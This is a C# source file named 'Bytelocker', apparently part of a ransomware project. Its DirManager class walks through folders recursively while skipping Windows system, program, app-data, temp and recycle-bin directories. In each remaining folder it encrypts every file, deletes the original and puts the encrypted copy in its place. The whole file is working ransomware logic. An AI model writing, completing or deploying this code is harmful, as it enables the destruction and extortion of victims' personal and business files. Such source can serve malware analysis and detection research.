using System;
using System.Collections.Generic;
using System.IO;

namespace Bytelocker.CryptoManager
{
    internal class DirManager
    {
        public static List<string> FOLDERS_TO_EXCLUDE = new List<string>
        {
            Environment.GetEnvironmentVariable("windir").ToLower(),
            Environment.GetEnvironmentVariable("ProgramData").ToLower(),
            Environment.GetEnvironmentVariable("APPDATA").ToLower(),
            Environment.GetEnvironmentVariable("LOCALAPPDATA").ToLower(),
            (Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files").ToLower(),
            Environment.GetEnvironmentVariable("TEMP").ToLower(), Environment.GetEnvironmentVariable("TMP").ToLower(),
            (Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files (x86)").ToLower(), "$recycle.bin"
        };

        private string dir_path;

        public void ChooseDir(string dir_path)
        {
            this.dir_path = dir_path;
        }

        public void EncryptDir()
        {
            var fm = new FileManager();

            try
            {
                var dir_files = Directory.GetFiles(dir_path);

                foreach (var file_path in dir_files)
                {
                    fm.ChooseFile(file_path);
                    fm.SetupFileEncrypter();
                    if (fm.EncryptFile())
                    {
                        fm.DeleteFile();
                        fm.RenameTmpFileToOrig();
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                // if folder cannot be accessed
            }
            catch (Exception)
            {
            }
        }

        public static List<string> GetFoldersRecursive(string initDir)
        {
            var stack_dirs = new Stack<string>();
            var list_dirs = new List<string>();

            stack_dirs.Push(initDir);

            while (stack_dirs.Count > 0)
            {
                var dir = stack_dirs.Pop();

                try
                {
                    if (!FOLDERS_TO_EXCLUDE.Contains(dir.ToLower()))
                    {
                        list_dirs.Add(dir);

                        foreach (var sub_dir in Directory.GetDirectories(dir)) stack_dirs.Push(sub_dir);
                    }
                }
                catch (Exception)
                {
                }
            }

            return list_dirs;
        }
    }
}